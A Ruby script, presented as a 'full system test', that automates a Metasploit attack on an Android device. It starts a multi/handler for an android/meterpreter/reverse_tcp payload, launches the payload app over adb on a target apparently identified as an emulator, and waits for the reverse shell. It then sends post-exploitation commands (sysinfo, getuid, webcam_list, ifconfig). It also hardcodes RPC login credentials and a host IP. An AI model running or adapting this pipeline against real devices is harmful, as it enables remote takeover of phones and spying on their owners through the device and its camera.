puts "=== FULL SYSTEM TEST v2 ==="

require 'msfrpc-client'

target_device = "127.0.0.1:5555" # MuMu
adb_host = ENV['ADB_HOST'] || '100.102.229.216'

puts "Target: #{target_device}"
puts "ADB Host: #{adb_host}"

begin
  puts "\n[1] Connecting to Metasploit..."
  rpc = Msf::RPC::Client.new(
    host: ENV['RAILS_HOST'] || 'metasploit',
    port: 3333,
    uri: '/api/',
    ssl: true
  )
  rpc.login('cool', 'looc')
  
  # Ensure Handler
  jobs = rpc.call('job.list')
  has_handler = jobs.values.any? { |j| j.include?("multi/handler") || j.include?("Multi-Handler") }
  
  if has_handler
     puts "✅ Handler already running."
  else
     puts "⚠️ Starting Multi-Handler on 0.0.0.0:4444..."
     res = rpc.call('module.execute', 'exploit', 'multi/handler', {
       'PAYLOAD' => 'android/meterpreter/reverse_tcp',
       'LHOST' => '0.0.0.0',
       'LPORT' => 4444,
       'ExitOnSession' => false,
       'Job' => true
     })
     puts "Handler Started: #{res}"
     sleep 2
  end

  # Launch App
  puts "\n[2] Launching Payload on Device..."
  cmd = "adb -H #{adb_host} -s #{target_device} shell am force-stop com.metasploit.stage"
  system(cmd) # Stop first
  sleep 1
  cmd = "adb -H #{adb_host} -s #{target_device} shell am start -n com.metasploit.stage/.MainActivity"
  puts "Running: #{cmd}"
  system(cmd)
  
  puts "Waiting 20s for reverse connection..."
  sleep 20
  
  # Check Session
  puts "\n[3] Checking Sessions..."
  sessions = rpc.call('session.list')
  session_ids = sessions.keys
  puts "Active Sessions: #{session_ids}"
  
  session_id = session_ids.last # Get latest
  
  if session_id
    puts "✅ Session #{session_id} established! Starting Functional Tests..."
    
    # Define Tests
    tests = [
      'sysinfo',
      'getuid',
      'webcam_list',
      'ifconfig'
    ]
    
    tests.each do |cmd|
      puts "\n--- Test: #{cmd} ---"
      rpc.call('session.meterpreter_write', session_id, cmd)
      
      output = ""
      # Read multiple times to gather output
      5.times do 
        sleep 1
        res = rpc.call('session.meterpreter_read', session_id)
        if res && res['data'] && !res['data'].empty?
           output += res['data']
        end
      end
      
      puts output.strip.empty? ? "⚠️ No output or slow response" : output.strip
      puts "✅ Command Sent"
    end
    
    puts "\n=== ALL TESTS COMPLETED ==="
  else
    puts "❌ No session established. Check logs."
  end

rescue => e
  puts "❌ Error: #{e.message}"
  puts e.backtrace
end
